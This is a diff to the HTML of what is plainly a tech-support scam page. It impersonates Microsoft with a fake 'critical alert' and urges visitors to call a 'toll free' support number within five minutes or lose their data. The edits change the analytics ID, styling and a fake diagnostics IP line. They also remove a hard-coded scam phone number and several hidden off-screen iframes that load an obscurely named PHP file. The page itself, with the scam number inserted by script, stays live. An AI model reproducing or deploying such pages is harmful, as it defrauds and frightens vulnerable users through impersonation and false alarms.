@@ -8,14 +8,15 @@
         <meta name=robots content=NOINDEX,NOFOLLOW>
 
         <!-- Global site tag (gtag.js) - Google Analytics -->
-<script async src="https://www.googletagmanager.com/gtag/js?id=UA-155010271-2"></script>
-<script>
-  window.dataLayer = window.dataLayer || [];
-  function gtag(){dataLayer.push(arguments);}
-  gtag('js', new Date());
+      <script async src="https://www.googletagmanager.com/gtag/js?id=UA-122392890-2"></script>
+      <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
 
-  gtag('config', 'UA-155010271-2');
-</script>
+      gtag('config', 'UA-122392890-2');
+      </script>
+
 
 
         <style>
@@ -206,8 +207,8 @@
 
                     </div>
                     <div style=float:left;height:250px;width:520px;padding-left:20px;padding-top:25px;color:#FFF>
-                        Please call &nbsp;us immediately at: </br> <script>
-                            document.write('<span style="font-size:25px;font-weight:bold;">' + phone + " (Toll Free)</span>");
+                        Please call &nbsp;us immediately at: <script>
+                            document.write('<span style="font-size:22;font-weight:bold;">' + phone + "</span>");
                         </script>
                         <br>
                         Do not ignore this critical alert.<br/>
@@ -221,8 +222,8 @@
                         <br>
                         You must contact us immediately so that our expert engineers can walk you through the removal &nbsp;process over the phone to protect your identity. Please call us within the next &nbsp;5 minutes to prevent your &nbsp;computer from being disabled or from any information loss.<br></br>
                     </div>
-                    <div style="margin-top:440px">
-                        <h1 style="color:#ffff;font-weight:900; font-size:25px">
+                    <div style=margin-top:420px>
+                        <h1 style="color:#ffff;font-weight:900; font-size:30px">
                             Call Microsoft Windows Support<br>
                             <script>
                                 document.write('<span style="color:#7fff7f">' + phone + " (Toll FREE)</span> ");
@@ -410,11 +411,6 @@ $(function() {
     } else {}
     ;</script>
 
-    <div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="Hdsdsdsdsuewewewew44m.php"></iframe></div>
-    <div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="Hdsdsdsdsuewewewew44m.php"></iframe></div>
-
-
-
 
 <div class="fixed">}
 </script>
@@ -433,17 +429,6 @@ $(function() {
             Error &nbsp;Logged at: <script>
                 document.write(formatAMPM());
             </script>
-            <br>Microsoft Diagnostics IP Address: 129.0.0.1</br>
-            <div style="position:absolute; top:50px; right:35px;"><h3 style="font-size:24px; font-weight:bold;">Call Support +1-866-475-7375
-          </h3></div>
+            <br>Microsoft Diagnostics IP Address: 127.0.0.1</br>
 </div>
-</u></b></div>
-
-
-	  <div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="Hdsdsdsdsuewewewew44m.php"></iframe></div>
-	  <div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="Hdsdsdsdsuewewewew44m.php"></iframe></div>
-
-	  <div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="Hdsdsdsdsuewewewew44m.php"></iframe></div>
-	  <div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="Hdsdsdsdsuewewewew44m.php"></iframe></div>
-
-</body></html>
+</u></b></div></body></html>
